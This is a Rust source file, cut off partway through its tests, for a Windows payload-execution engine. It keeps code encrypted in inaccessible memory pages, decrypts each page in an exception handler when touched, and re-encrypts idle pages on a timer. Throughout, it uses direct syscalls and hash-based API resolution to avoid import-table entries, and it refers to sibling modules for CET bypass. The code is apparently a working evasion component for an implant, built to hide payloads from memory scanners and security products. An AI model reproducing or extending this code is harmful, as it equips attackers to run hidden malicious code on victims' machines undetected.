// Page Fault Driven Execution
//
// Implements a page-fault-based code execution engine that keeps payload
// pages encrypted (XChaCha20-Poly1305) with PAGE_NOACCESS until needed.
// A Vectored Exception Handler (VEH) intercepts STATUS_ACCESS_VIOLATION
// faults, decrypts the faulting page, flips protection to PAGE_EXECUTE_READ,
// and resumes execution.  A periodic timer re-encrypts pages that haven't
// been accessed recently, minimizing the window in which decrypted code
// resides in memory.
//
// Windows x86_64 only.  Feature-gated behind `page-fault-exec`.

#![cfg(all(target_os = "windows", target_arch = "x86_64", feature = "page-fault-exec"))]

use std::alloc::Layout;
use std::cell::UnsafeCell;
use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, AtomicPtr, AtomicU32, AtomicU64, Ordering};
use std::sync::OnceLock;

/// A wrapper around `UnsafeCell<T>` that implements `Sync`.
///
/// Safety justification: all access is single-threaded by design — the VEH
/// handler runs on the faulting thread and the timer APC runs on the same
/// thread during alertable wait.  No concurrent mutation is possible.
struct SyncCell<T>(UnsafeCell<T>);

unsafe impl<T> Sync for SyncCell<T> {}
unsafe impl<T> Send for SyncCell<T> {}

use chacha20::cipher::KeyIvInit;
use chacha20poly1305::{
    aead::{AeadInPlace, KeyInit},
    XChaCha20Poly1305, XNonce,
};
use rand::RngCore;

// ─── Constants ────────────────────────────────────────────────────────────

/// NTSTATUS code for STATUS_ACCESS_VIOLATION.
const STATUS_ACCESS_VIOLATION: u32 = 0xC0000005;

/// VEH return: exception handled, continue execution.
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
/// VEH return: pass to next handler.
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Memory protection constants.
const PAGE_NOACCESS: u64 = 0x01;
const PAGE_READWRITE: u64 = 0x04;
const PAGE_EXECUTE_READ: u64 = 0x20;

/// Memory allocation constants.
const MEM_COMMIT: u64 = 0x00001000;
const MEM_RESERVE: u64 = 0x00002000;
const MEM_RELEASE: u64 = 0x00008000;

/// Default page size on x86_64 Windows.
const PAGE_SIZE: usize = 4096;

/// Maximum number of protected pages.
const MAX_PAGES: usize = 256;

/// Default re-encryption interval in milliseconds (5 s).
const DEFAULT_REENCRYPT_INTERVAL_MS: u32 = 5000;

/// Maximum number of pages to track before anomaly is flagged.
const MAX_FAULTS_BEFORE_ANOMALY: u32 = 4096;

/// Maximum number of exception parameters.
const EXCEPTION_MAXIMUM_PARAMETERS: usize = 15;

// ─── Minimal VEH Types ────────────────────────────────────────────────────
//
// Local definitions matching cet_bypass.rs / exception_ssn.rs pattern.
// Avoids importing winapi types which would create IAT entries.

type DWORD = u32;
type PVOID = *mut c_void;

/// Windows x64 EXCEPTION_RECORD.
#[repr(C)]
struct ExceptionRecord {
    ExceptionCode: DWORD,
    ExceptionFlags: DWORD,
    ExceptionRecord: *mut ExceptionRecord,
    ExceptionAddress: PVOID,
    NumberParameters: DWORD,
    ExceptionInformation: [usize; EXCEPTION_MAXIMUM_PARAMETERS],
}

/// Windows x64 CONTEXT structure (minimal — only fields we need).
#[repr(C)]
struct Context {
    _pad: [u8; 0xF80], // offset 0x00 – 0xF7F: P1Home..FltSave
    Rip: u64,          // offset 0xF80
    _pad2: [u8; 0x4D0], // remaining CONTEXT fields
}

/// Windows EXCEPTION_POINTERS.
#[repr(C)]
struct ExceptionPointers {
    ExceptionRecord: *mut ExceptionRecord,
    ContextRecord: *mut Context,
}

// Static assertions for CONTEXT layout.
const _: () = assert!(std::mem::offset_of!(Context, Rip) == 0xF80);

// ─── Per-Page Metadata ────────────────────────────────────────────────────

/// State of a single protected page.
#[derive(Clone)]
struct ProtectedPage {
    /// Base address of the page in memory.
    base: *mut c_void,
    /// Size of the page (normally PAGE_SIZE, may be less for the last page).
    size: usize,
    /// XChaCha20-Poly1305 nonce (24 bytes).  Unique per page.
    nonce: [u8; 24],
    /// Authentication tag from the last encryption (16 bytes).
    tag: [u8; 16],
    /// Whether the page is currently decrypted (PAGE_EXECUTE_READ).
    decrypted: bool,
    /// Number of times this page has been faulted in.
    fault_count: u32,
    /// Timestamp (ms via QueryPerformanceCounter) of last access.
    last_access_ms: u64,
}

impl Default for ProtectedPage {
    fn default() -> Self {
        Self {
            base: std::ptr::null_mut(),
            size: 0,
            nonce: [0u8; 24],
            tag: [0u8; 16],
            decrypted: false,
            fault_count: 0,
            last_access_ms: 0,
        }
    }
}

// Safety: ProtectedPage contains raw pointers that are only accessed from the
// single-threaded PageFaultExec.  The pointer is valid as long as the page is
// allocated.
unsafe impl Send for ProtectedPage {}
unsafe impl Sync for ProtectedPage {}

// ─── Global State ─────────────────────────────────────────────────────────

/// Encryption key (32 bytes).  Set once during initialization.
static ENCRYPTION_KEY: OnceLock<[u8; 32]> = OnceLock::new();

/// The single PageFaultExec instance.
static EXEC_INSTANCE: OnceLock<SyncCell<PageFaultExec>> = OnceLock::new();

/// Whether the VEH handler has been installed.
static VEH_INSTALLED: AtomicBool = AtomicBool::new(false);

/// Handle returned by AddVectoredExceptionHandler (for cleanup).
static VEH_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(std::ptr::null_mut());

/// Handle for the re-encryption timer.
static TIMER_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(std::ptr::null_mut());

// ─── Statistics ───────────────────────────────────────────────────────────

/// Total page faults handled.
static STAT_FAULT_COUNT: AtomicU32 = AtomicU32::new(0);
/// Total decryption operations.
static STAT_DECRYPT_COUNT: AtomicU32 = AtomicU32::new(0);
/// Total re-encryption operations.
static STAT_REENCRYPT_COUNT: AtomicU32 = AtomicU32::new(0);
/// Anomaly flag (too many faults in a short interval, possible scanning).
static STAT_ANOMALY: AtomicBool = AtomicBool::new(false);

// ─── XChaCha20-Poly1305 Helpers ───────────────────────────────────────────

/// Encrypt `data` in-place with XChaCha20-Poly1305.
/// Returns the 16-byte authentication tag.
fn xchacha20_encrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) -> [u8; 16] {
    let iv = XNonce::from_slice(nonce);
    let cipher = XChaCha20Poly1305::new(key.into());
    let aad: &[u8] = b"";
    let mut buf = data.to_vec();
    let tag = cipher
        .encrypt_in_place_detached(iv, aad, &mut buf)
        .expect("XChaCha20-Poly1305 encryption should not fail for valid input");
    data.copy_from_slice(&buf);
    tag.into()
}

/// Decrypt `data` in-place with XChaCha20-Poly1305.
/// Returns `Ok(())` on success, `Err` on tag verification failure.
fn xchacha20_decrypt(
    key: &[u8; 32],
    nonce: &[u8; 24],
    data: &mut [u8],
    tag: &[u8; 16],
) -> Result<(), ()> {
    let iv = XNonce::from_slice(nonce);
    let cipher = XChaCha20Poly1305::new(key.into());
    let aad: &[u8] = b"";
    let mut buf = data.to_vec();
    cipher
        .decrypt_in_place_detached(iv, aad, &mut buf, tag.into())
        .map_err(|_| ())?;
    data.copy_from_slice(&buf);
    Ok(())
}

// ─── Syscall Helpers ──────────────────────────────────────────────────────

/// Change memory protection via NtProtectVirtualMemory.
/// Returns the old protection value, or 0 on failure.
unsafe fn protect_memory(base: *mut c_void, size: usize, new_protect: u64) -> u64 {
    let mut old_protect: u64 = 0;
    let mut base_ptr = base as u64;
    let mut region_size = size as u64;
    let status = crate::syscalls::syscall_NtProtectVirtualMemory(
        crate::win_types::CURRENT_PROCESS as u64, // (HANDLE)-1
        &mut base_ptr as *mut u64 as u64,
        &mut region_size as *mut u64 as u64,
        new_protect,
        &mut old_protect as *mut u64 as u64,
    );
    if status < 0 {
        log::warn!(
            "page_fault_exec: NtProtectVirtualMemory({:#x}, {:#x}) failed: NTSTATUS {:#010x}",
            base as usize,
            new_protect,
            status as u32
        );
        0
    } else {
        old_protect
    }
}

/// Allocate virtual memory via NtAllocateVirtualMemory.
/// Returns the allocated base pointer, or null on failure.
unsafe fn allocate_memory(size: usize) -> *mut c_void {
    let mut base: *mut c_void = std::ptr::null_mut();
    let mut region_size = size as u64;
    let status = crate::syscall!(
        "NtAllocateVirtualMemory",
        crate::win_types::CURRENT_PROCESS as u64, // (HANDLE)-1
        &mut base as *mut _ as u64,
        0u64, // ZeroBits
        &mut region_size as *mut _ as u64,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )
    .unwrap_or(-1);
    if status < 0 || base.is_null() {
        log::warn!(
            "page_fault_exec: NtAllocateVirtualMemory({} bytes) failed: NTSTATUS {:#010x}",
            size,
            status as u32
        );
        std::ptr::null_mut()
    } else {
        log::debug!(
            "page_fault_exec: allocated {} bytes at {:#x}",
            size,
            base as usize
        );
        base
    }
}

/// Free virtual memory via NtFreeVirtualMemory.
unsafe fn free_memory(base: *mut c_void) {
    let mut base_ptr = base;
    let mut region_size: usize = 0; // MEM_RELEASE ignores size
    let status = crate::syscall!(
        "NtFreeVirtualMemory",
        crate::win_types::CURRENT_PROCESS as u64,
        &mut base_ptr as *mut _ as u64,
        &mut region_size as *mut _ as u64,
        MEM_RELEASE,
    )
    .unwrap_or(-1);
    if status < 0 {
        log::warn!(
            "page_fault_exec: NtFreeVirtualMemory({:#x}) failed: NTSTATUS {:#010x}",
            base as usize,
            status as u32
        );
    }
}

/// Read the high-resolution timer (QueryPerformanceCounter) in milliseconds.
fn query_performance_ms() -> u64 {
    unsafe {
        let mut counter: i64 = 0;
        let mut freq: i64 = 0;

        type FnQueryPerformanceFrequency =
            unsafe extern "system" fn(*mut i64) -> i32;
        type FnQueryPerformanceCounter =
            unsafe extern "system" fn(*mut i64) -> i32;

        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
            b"kernel32.dll\0",
        )) {
            Some(b) => b,
            None => return 0,
        };

        // Resolve QPC
        let qpc_addr = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"QueryPerformanceCounter\0"),
        );
        let qpf_addr = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"QueryPerformanceFrequency\0"),
        );

        if let (Some(qpc), Some(qpf)) = (qpc_addr, qpf_addr) {
            let qpc_fn: FnQueryPerformanceCounter = std::mem::transmute(qpc);
            let qpf_fn: FnQueryPerformanceFrequency = std::mem::transmute(qpf);
            qpc_fn(&mut counter);
            qpf_fn(&mut freq);
        }

        if freq > 0 {
            (counter as u64 * 1000) / (freq as u64)
        } else {
            0
        }
    }
}

// ─── PageFaultExec ────────────────────────────────────────────────────────

/// Manages a set of encrypted code pages that are decrypted on demand via
/// page-fault handling.
struct PageFaultExec {
    /// Metadata for each tracked page.
    pages: Vec<ProtectedPage>,
    /// Number of active (non-null) page entries.
    active_count: usize,
    /// Re-encryption interval in milliseconds.
    reencrypt_interval_ms: u32,
    /// Whether the timer is active.
    timer_active: bool,
}

// Safety: PageFaultExec is only accessed through UnsafeCell inside a OnceLock.
// All mutation is single-threaded (timer APC runs on the same thread in
// alertable wait; VEH handler runs on the faulting thread).
unsafe impl Sync for PageFaultExec {}

impl PageFaultExec {
    /// Create a new (empty) PageFaultExec.
    fn new(reencrypt_interval_ms: u32) -> Self {
        Self {
            pages: Vec::with_capacity(MAX_PAGES),
            active_count: 0,
            reencrypt_interval_ms,
            timer_active: false,
        }
    }

    /// Initialize the engine with a payload.
    ///
    /// - Divides `payload` into page-sized chunks.
    /// - Allocates RW memory for each chunk.
    /// - Encrypts each chunk with XChaCha20-Poly1305 using a unique nonce.
    /// - Sets each page to PAGE_NOACCESS.
    /// - Installs the VEH handler.
    ///
    /// Returns `Ok(())` on success.
    ///
    /// # Safety
    ///
    /// The caller must ensure `payload` is valid executable code that will
    /// not be moved or freed while the engine is active.  The payload data
    /// is copied into newly-allocated pages.
    pub unsafe fn initialize(&mut self, payload: &[u8]) -> Result<(), &'static str> {
        if payload.is_empty() {
            return Err("payload is empty");
        }
        if self.active_count > 0 {
            return Err("already initialized — call shutdown() first");
        }

        let key = ENCRYPTION_KEY
            .get()
            .ok_or("encryption key not set — call set_encryption_key() first")?;

        // Calculate number of pages needed.
        let num_pages = (payload.len() + PAGE_SIZE - 1) / PAGE_SIZE;
        if num_pages > MAX_PAGES {
            return Err("payload too large — exceeds MAX_PAGES");
        }

        log::info!(
            "page_fault_exec: initializing with {} bytes → {} pages",
            payload.len(),
            num_pages
        );

        // Allocate and encrypt each page.
        for i in 0..num_pages {
            let offset = i * PAGE_SIZE;
            let chunk_size = std::cmp::min(PAGE_SIZE, payload.len() - offset);
            let chunk = &payload[offset..offset + chunk_size];

            // Allocate a full page (always PAGE_SIZE for alignment).
            let base = allocate_memory(PAGE_SIZE);
            if base.is_null() {
                // Cleanup previously allocated pages on failure.
                for pp in &self.pages {
                    if !pp.base.is_null() {
                        free_memory(pp.base);
                    }
                }
                self.pages.clear();
                return Err("failed to allocate memory for page");
            }

            // Copy payload chunk into the allocated page.
            std::ptr::copy_nonoverlapping(chunk.as_ptr(), base as *mut u8, chunk_size);
            // Zero-fill the remainder of the page if the chunk is smaller.
            if chunk_size < PAGE_SIZE {
                std::ptr::write_bytes(
                    (base as *mut u8).add(chunk_size),
                    0,
                    PAGE_SIZE - chunk_size,
                );
            }

            // Generate a random nonce.
            let mut nonce = [0u8; 24];
            rand::thread_rng().fill_bytes(&mut nonce);

            // Encrypt in-place.
            let page_slice = std::slice::from_raw_parts_mut(base as *mut u8, PAGE_SIZE);
            let tag = xchacha20_encrypt(key, &nonce, page_slice);

            // Set page to PAGE_NOACCESS (encrypted & inaccessible).
            let old_prot = protect_memory(base, PAGE_SIZE, PAGE_NOACCESS);
            if old_prot == 0 {
                log::warn!("page_fault_exec: failed to set PAGE_NOACCESS for page {}", i);
            }

            self.pages.push(ProtectedPage {
                base,
                size: PAGE_SIZE,
                nonce,
                tag,
                decrypted: false,
                fault_count: 0,
                last_access_ms: 0,
            });
            self.active_count += 1;
        }

        // Install the VEH handler.
        if !install_veh() {
            // Cleanup on failure.
            for pp in &self.pages {
                if !pp.base.is_null() {
                    // Temporarily make writable so we can free.
                    protect_memory(pp.base, pp.size, PAGE_READWRITE);
                    free_memory(pp.base);
                }
            }
            self.pages.clear();
            self.active_count = 0;
            return Err("failed to install VEH handler");
        }

        // Start the re-encryption timer.
        self.start_reencrypt_timer();

        log::info!(
            "page_fault_exec: initialized {} pages, timer interval {} ms",
            self.active_count,
            self.reencrypt_interval_ms
        );
        Ok(())
    }

    /// Decrypt a specific page by index.
    fn decrypt_page(&mut self, index: usize) -> Result<(), &'static str> {
        let pp = self
            .pages
            .get_mut(index)
            .ok_or("page index out of range")?;

        if pp.decrypted {
            // Already decrypted — just update timestamp.
            pp.last_access_ms = query_performance_ms();
            pp.fault_count += 1;
            return Ok(());
        }

        let key = ENCRYPTION_KEY
            .get()
            .ok_or("encryption key not available")?;

        // Set page to PAGE_READWRITE so we can write decrypted data.
        unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };

        // Decrypt in-place.
        let page_slice =
            unsafe { std::slice::from_raw_parts_mut(pp.base as *mut u8, pp.size) };
        xchacha20_decrypt(key, &pp.nonce, page_slice, &pp.tag)
            .map_err(|_| "XChaCha20-Poly1305 decryption failed — tag mismatch")?;

        // Set page to PAGE_EXECUTE_READ so it can run.
        unsafe { protect_memory(pp.base, pp.size, PAGE_EXECUTE_READ) };

        pp.decrypted = true;
        pp.last_access_ms = query_performance_ms();
        pp.fault_count += 1;

        STAT_DECRYPT_COUNT.fetch_add(1, Ordering::Relaxed);

        Ok(())
    }

    /// Re-encrypt a specific page by index.
    fn reencrypt_page(&mut self, index: usize) -> Result<(), &'static str> {
        let pp = self
            .pages
            .get_mut(index)
            .ok_or("page index out of range")?;

        if !pp.decrypted {
            return Ok(()); // Already encrypted.
        }

        let key = ENCRYPTION_KEY
            .get()
            .ok_or("encryption key not available")?;

        // Generate a fresh nonce for forward secrecy.
        rand::thread_rng().fill_bytes(&mut pp.nonce);

        // Set page to PAGE_READWRITE so we can encrypt in-place.
        unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };

        // Encrypt in-place.
        let page_slice =
            unsafe { std::slice::from_raw_parts_mut(pp.base as *mut u8, pp.size) };
        pp.tag = xchacha20_encrypt(key, &pp.nonce, page_slice);

        // Set page to PAGE_NOACCESS.
        unsafe { protect_memory(pp.base, pp.size, PAGE_NOACCESS) };

        pp.decrypted = false;

        STAT_REENCRYPT_COUNT.fetch_add(1, Ordering::Relaxed);

        Ok(())
    }

    /// Re-encrypt all currently-decrypted pages.
    fn reencrypt_all(&mut self) {
        let now_ms = query_performance_ms();
        for i in 0..self.pages.len() {
            let should_reencrypt = {
                let pp = &self.pages[i];
                pp.decrypted
                    && (now_ms.saturating_sub(pp.last_access_ms))
                        > self.reencrypt_interval_ms as u64
            };
            if should_reencrypt {
                if let Err(e) = self.reencrypt_page(i) {
                    log::warn!("page_fault_exec: re-encrypt page {} failed: {}", i, e);
                }
            }
        }
    }

    /// Start the periodic re-encryption timer via NtCreateTimer / NtSetTimer.
    fn start_reencrypt_timer(&mut self) {
        let interval_ms = self.reencrypt_interval_ms;

        unsafe {
            // Create a notification timer.
            let mut timer_handle: u64 = 0;
            let status = crate::syscalls::syscall_NtCreateTimer(
                &mut timer_handle as *mut u64 as u64,
                0x001F0003u64, // TIMER_ALL_ACCESS
                0u64,          // no object attributes
                0u64,          // NotificationTimer
            );
            if status < 0 {
                log::warn!(
                    "page_fault_exec: NtCreateTimer failed: {:#010x}",
                    status as u32
                );
                return;
            }

            TIMER_HANDLE.store(timer_handle as *mut c_void, Ordering::SeqCst);

            // Due time: negative = relative, in 100-ns units.
            let due_time: i64 = -((interval_ms as i64) * 10_000);

            let status = crate::syscalls::syscall_NtSetTimer(
                timer_handle,
                &due_time as *const i64 as u64,
                reencrypt_timer_apc as *const () as u64, // APC callback
                0u64,                        // context
                0u64,                        // ResumeTimer = FALSE
                0u64,                        // Period = 0 (one-shot, we re-arm)
                0u64,                        // PreviousState = NULL
            );
            if status < 0 {
                log::warn!(
                    "page_fault_exec: NtSetTimer failed: {:#010x}",
                    status as u32
                );
                return;
            }

            self.timer_active = true;
            log::debug!(
                "page_fault_exec: re-encryption timer started ({} ms)",
                interval_ms
            );
        }
    }

    /// Shut down the engine: re-encrypt all pages, remove VEH, free memory.
    pub fn shutdown(&mut self) {
        log::info!("page_fault_exec: shutting down");

        // Stop the timer.
        let timer = TIMER_HANDLE.swap(std::ptr::null_mut(), Ordering::SeqCst);
        if !timer.is_null() {
            unsafe {
                let _ = crate::syscalls::syscall_NtClose(timer as u64);
            }
        }
        self.timer_active = false;

        // Remove the VEH handler.
        remove_veh();

        // Re-encrypt and free all pages.
        for pp in &mut self.pages {
            if !pp.base.is_null() {
                if pp.decrypted {
                    // Make writable so we can free.
                    unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };
                } else {
                    // Page is encrypted + NOACCESS; make writable to free.
                    unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };
                }
                unsafe { free_memory(pp.base) };
                pp.base = std::ptr::null_mut();
            }
        }
        self.pages.clear();
        self.active_count = 0;

        log::info!("page_fault_exec: shutdown complete");
    }

    /// Look up the page index for a given fault address.
    /// Returns `Some(index)` if the address falls within a tracked page.
    fn find_page_for_address(&self, addr: usize) -> Option<usize> {
        // Align the address down to the page boundary.
        let page_base = addr & !(PAGE_SIZE - 1);
        for (i, pp) in self.pages.iter().enumerate() {
            let pp_base = pp.base as usize;
            if page_base >= pp_base && page_base < pp_base + pp.size {
                return Some(i);
            }
        }
        None
    }

    /// Return the base address of page `index`, or null.
    fn page_base(&self, index: usize) -> *mut c_void {
        self.pages
            .get(index)
            .map(|p| p.base)
            .unwrap_or(std::ptr::null_mut())
    }
}

// ─── APC Callback for Re-Encryption Timer ─────────────────────────────────

/// Timer APC callback.  Re-encrypts stale pages and re-arms the timer.
///
/// # Safety
///
/// Called by the kernel on the timer thread.  Must not panic.
unsafe extern "system" fn reencrypt_timer_apc(
    _apc_context: *mut c_void,
    _timer_low_value: u32,
    _timer_high_value: u32,
) {
    // Re-encrypt stale pages.
    if let Some(cell) = EXEC_INSTANCE.get() {
        let exec = &mut *cell.0.get();
        exec.reencrypt_all();

        // Check for anomaly.
        let faults = STAT_FAULT_COUNT.load(Ordering::Relaxed);
        if faults > MAX_FAULTS_BEFORE_ANOMALY {
            STAT_ANOMALY.store(true, Ordering::Relaxed);
            log::warn!(
                "page_fault_exec: anomaly detected — {} total faults",
                faults
            );
        }

        // Re-arm the timer.
        let timer = TIMER_HANDLE.load(Ordering::SeqCst);
        if !timer.is_null() {
            let interval_ms = exec.reencrypt_interval_ms;
            let due_time: i64 = -((interval_ms as i64) * 10_000);
            let _ = crate::syscalls::syscall_NtSetTimer(
                timer as u64,
                &due_time as *const i64 as u64,
                reencrypt_timer_apc as *const () as u64,
                0u64,
                0u64,
                0u64,
                0u64,
            );
        }
    }
}

// ─── VEH Handler ──────────────────────────────────────────────────────────

/// VEH handler that intercepts page faults on protected pages.
///
/// When a STATUS_ACCESS_VIOLATION occurs at an address belonging to one
/// of our tracked pages, we:
///   1. Decrypt the page with XChaCha20-Poly1305.
///   2. Set protection to PAGE_EXECUTE_READ.
///   3. Return EXCEPTION_CONTINUE_EXECUTION to re-execute the faulting
///      instruction.
unsafe extern "system" fn veh_page_fault_handler(
    exception_info: *mut ExceptionPointers,
) -> i32 {
    let ep = match exception_info.as_ref() {
        Some(p) => p,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    let record = match ep.ExceptionRecord.as_ref() {
        Some(r) => r,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    // Only handle STATUS_ACCESS_VIOLATION.
    if record.ExceptionCode != STATUS_ACCESS_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // ExceptionInformation[1] contains the faulting address for access violations.
    if record.NumberParameters < 2 {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    let fault_addr = record.ExceptionInformation[1];

    // Look up the page in the global EXEC_INSTANCE.
    let exec_cell = match EXEC_INSTANCE.get() {
        Some(c) => c,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };
    let exec = &mut *exec_cell.0.get();

    let page_index = match exec.find_page_for_address(fault_addr) {
        Some(idx) => idx,
        None => return EXCEPTION_CONTINUE_SEARCH, // Not one of our pages.
    };

    // Decrypt the page.
    match exec.decrypt_page(page_index) {
        Ok(()) => {
            STAT_FAULT_COUNT.fetch_add(1, Ordering::Relaxed);
            log::debug!(
                "page_fault_exec: decrypted page {} at {:#x} (fault at {:#x})",
                page_index,
                exec.page_base(page_index) as usize,
                fault_addr
            );
            EXCEPTION_CONTINUE_EXECUTION
        }
        Err(e) => {
            log::error!(
                "page_fault_exec: failed to decrypt page {}: {}",
                page_index,
                e
            );
            EXCEPTION_CONTINUE_SEARCH
        }
    }
}

/// Install the VEH handler via AddVectoredExceptionHandler resolved by hash.
fn install_veh() -> bool {
    if VEH_INSTALLED.load(Ordering::Acquire) {
        return true;
    }

    unsafe {
        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
            b"kernel32.dll\0",
        )) {
            Some(b) => b,
            None => {
                log::error!(
                    "page_fault_exec: failed to resolve kernel32 for AddVectoredExceptionHandler"
                );
                return false;
            }
        };

        let fn_addr = match pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"AddVectoredExceptionHandler\0"),
        ) {
            Some(a) => a,
            None => {
                log::error!("page_fault_exec: failed to resolve AddVectoredExceptionHandler");
                return false;
            }
        };

        type FnAddVectoredExceptionHandler = unsafe extern "system" fn(
            u32,
            unsafe extern "system" fn(*mut ExceptionPointers) -> i32,
        ) -> *mut c_void;

        let add_veh: FnAddVectoredExceptionHandler = std::mem::transmute(fn_addr);

        // Install as first handler (first=1) for maximum priority.
        let handle = add_veh(1, veh_page_fault_handler);
        if handle.is_null() {
            log::error!("page_fault_exec: AddVectoredExceptionHandler returned NULL");
            return false;
        }

        VEH_HANDLE.store(handle, Ordering::SeqCst);
        VEH_INSTALLED.store(true, Ordering::Release);
        log::info!("page_fault_exec: VEH handler installed successfully");
        true
    }
}

/// Remove the VEH handler via RemoveVectoredExceptionHandler resolved by hash.
fn remove_veh() {
    if !VEH_INSTALLED.load(Ordering::Acquire) {
        return;
    }

    let handle = VEH_HANDLE.swap(std::ptr::null_mut(), Ordering::SeqCst);
    if handle.is_null() {
        return;
    }

    unsafe {
        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
            b"kernel32.dll\0",
        )) {
            Some(b) => b,
            None => {
                log::error!(
                    "page_fault_exec: cannot resolve kernel32 for RemoveVectoredExceptionHandler"
                );
                return;
            }
        };

        let fn_addr = match pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"RemoveVectoredExceptionHandler\0"),
        ) {
            Some(a) => a,
            None => {
                log::error!("page_fault_exec: cannot resolve RemoveVectoredExceptionHandler");
                return;
            }
        };

        type FnRemoveVectoredExceptionHandler =
            unsafe extern "system" fn(*mut c_void) -> u32;

        let remove_veh: FnRemoveVectoredExceptionHandler = std::mem::transmute(fn_addr);
        let result = remove_veh(handle);
        if result == 0 {
            log::warn!("page_fault_exec: RemoveVectoredExceptionHandler returned 0");
        } else {
            log::info!("page_fault_exec: VEH handler removed");
        }
    }

    VEH_INSTALLED.store(false, Ordering::Release);
}

// ─── NtClose wrapper ──────────────────────────────────────────────────────
// The syscall_NtClose exists in syscalls.rs but we need a thin wrapper here
// for timer handle cleanup.  We just call through to the existing one.

// ─── Public API ───────────────────────────────────────────────────────────

/// Set the encryption key for page encryption.
///
/// Must be called before `initialize()`.  The key is 32 bytes.
/// Returns `false` if the key has already been set.
pub fn set_encryption_key(key: [u8; 32]) -> bool {
    ENCRYPTION_KEY.set(key).is_ok()
}

/// Initialize the page-fault execution engine with a payload.
///
/// # Safety
///
/// - Must be called from a single thread.
/// - `payload` must be valid executable code (position-independent).
/// - The caller must ensure no concurrent access to the returned pages.
pub unsafe fn initialize(payload: &[u8]) -> Result<(), &'static str> {
    // Create the instance if it doesn't exist yet.
    if EXEC_INSTANCE.get().is_none() {
        let _ = EXEC_INSTANCE.set(SyncCell(UnsafeCell::new(PageFaultExec::new(
            DEFAULT_REENCRYPT_INTERVAL_MS,
        ))));
    }

    let cell = EXEC_INSTANCE
        .get()
        .ok_or("failed to create PageFaultExec instance")?;
    (*cell.0.get()).initialize(payload)
}

/// Shut down the engine and release all resources.
///
/// # Safety
///
/// Must be called from the same thread that called `initialize()`.
/// No code within protected pages may be executing when this is called.
pub unsafe fn shutdown() {
    if let Some(cell) = EXEC_INSTANCE.get() {
        (*cell.0.get()).shutdown();
    }
}

/// Execute a function located within a protected page by payload offset.
///
/// Ensures the target page is decrypted before jumping to it.  The caller
/// provides the *offset* within the original payload (not an absolute address).
///
/// Returns the absolute address of the function entry point, or `None` if
/// the page cannot be decrypted.  The caller is responsible for calling it.
///
/// # Safety
///
/// - `payload_offset` must point to the start of a valid function within
///   the original payload.
/// - The returned pointer must be called with the correct calling convention.
/// - The caller must ensure no re-encryption occurs during execution
///   (the timer APC runs on the same thread in alertable wait).
pub unsafe fn execute_protected_function(payload_offset: usize) -> Option<*mut c_void> {
    let cell = EXEC_INSTANCE.get()?;
    let exec = &mut *cell.0.get();

    // Determine which page the offset falls in.
    let page_index = payload_offset / PAGE_SIZE;
    let offset_in_page = payload_offset % PAGE_SIZE;

    // Ensure the page is decrypted.
    if let Err(e) = exec.decrypt_page(page_index) {
        log::error!(
            "page_fault_exec: failed to decrypt page {} for execution: {}",
            page_index,
            e
        );
        return None;
    }

    // Get the absolute address.
    let base = exec.page_base(page_index);
    if base.is_null() {
        return None;
    }
    Some((base as usize + offset_in_page) as *mut c_void)
}

/// Call a function in a protected page by its absolute address.
///
/// This is a lower-level gateway that takes the runtime address directly.
/// The function at `addr` will be called.  If the page is encrypted, the
/// VEH handler will transparently decrypt it on the first access.
///
/// # Safety
///
/// - `addr` must be a valid function pointer within a managed page.
/// - The caller is responsible for ensuring the function signature matches.
pub unsafe fn call_protected_function(addr: *const c_void) {
    let func: fn() = std::mem::transmute(addr as usize);
    func();
}

/// Get statistics about the page-fault execution engine.
pub struct PageFaultStats {
    /// Total page faults handled.
    pub fault_count: u32,
    /// Total decryption operations.
    pub decrypt_count: u32,
    /// Total re-encryption operations.
    pub reencrypt_count: u32,
    /// Number of currently decrypted pages.
    pub active_pages: usize,
    /// Whether an anomaly has been detected.
    pub anomaly_detected: bool,
}

/// Retrieve current statistics.
pub fn get_stats() -> PageFaultStats {
    let active_pages = if let Some(cell) = EXEC_INSTANCE.get() {
        // Safety: we only read the `decrypted` flag; no mutation.
        let exec = unsafe { &*cell.0.get() };
        exec.pages.iter().filter(|p| p.decrypted).count()
    } else {
        0
    };

    PageFaultStats {
        fault_count: STAT_FAULT_COUNT.load(Ordering::Relaxed),
        decrypt_count: STAT_DECRYPT_COUNT.load(Ordering::Relaxed),
        reencrypt_count: STAT_REENCRYPT_COUNT.load(Ordering::Relaxed),
        active_pages,
        anomaly_detected: STAT_ANOMALY.load(Ordering::Relaxed),
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Encryption round-trip ──────────────────────────────────────────

    #[test]
    fn xchacha20_round_trip() {
        let key = [0x42u8; 32];
        let nonce = [0xABu8; 24];
        let original = b"Hello, page-fault execution engine!".to_vec();
        let mut data = original.clone();

        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
        assert_ne!(data, original, "encrypted data should differ from original");

        let result = xchacha20_decrypt(&key, &nonce, &mut data, &tag);
        assert!(result.is_ok(), "decryption should succeed");
        assert_eq!(data, original, "decrypted data should match original");
    }

    #[test]
    fn xchacha20_wrong_key_fails() {
        let key = [0x42u8; 32];
        let wrong_key = [0x43u8; 32];
        let nonce = [0xABu8; 24];
